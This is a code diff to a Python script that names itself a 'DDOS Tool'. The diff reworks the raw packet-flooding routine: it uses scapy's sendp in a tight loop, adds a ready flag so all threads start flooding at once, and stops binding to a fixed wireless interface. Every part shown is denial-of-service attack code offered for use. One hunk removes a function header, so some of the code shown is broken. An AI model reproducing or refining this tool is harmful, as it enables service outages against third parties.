@@ -20,13 +20,17 @@ parser = argparse.ArgumentParser(description="DDOS Tool")
 parser.add_argument("--raw",help="Attack without a open Port",action="store_true")
 args = parser.parse_args()
 ##################################DDOS METHODS#########################################
-def ddos_icmp(pkg):
+def ddos_raw(pkg):
+    global ready,pkgcount
+    while True:
+        if ready:
+            break
+        
     while True:
         try:
-            sendp(pkg,iface="wlan1",loop=1,verbose=0,inter=0.0001)
+            sendp(pkg,loop=1,verbose=0,inter=0.0001)
         except:
             pass
-def ddos(host,port):
     global ready,pkgcount,close
     try:
         sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
@@ -89,7 +93,7 @@ if method == "raw":
                     print "Processing Threads {0}".format(p)
                     old = p
                 try:
-                    cthread = threading.Thread(target=ddos_icmp,args=pkg)
+                    cthread = threading.Thread(target=ddos_raw,args=pkg)
                     cthread.daemon = True
                     cthread.start()
                 except:
@@ -97,12 +101,13 @@ if method == "raw":
             print "Processing Threads 100%"
             print
             print "Attacking Target"
+            ready = True
             while True:
                     try:
                         pass
                     except KeyboardInterrupt:
                         print "Cancel"
-                        break
+                        exit()
             exit()
 else:
     try:
